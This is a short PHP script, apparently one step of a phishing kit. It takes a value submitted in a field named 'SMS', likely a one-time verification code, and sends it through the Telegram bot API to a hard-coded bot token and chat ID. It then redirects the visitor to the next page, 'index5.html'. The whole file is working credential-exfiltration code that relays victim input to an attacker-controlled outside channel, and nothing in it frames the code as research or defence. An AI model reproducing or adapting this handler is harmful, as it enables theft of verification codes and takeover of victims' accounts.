<?php



$SMS = $_POST['SMS'];
$token = "6535119944:AAGj3u1rQgvCDIvfnfXGvAsRPr_wAecs4DU";
$chat_id = "-6007133947";
$arr = array(

  'SMS:' => $SMS
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: index5.html');
} else {
  echo "Error";
}
?>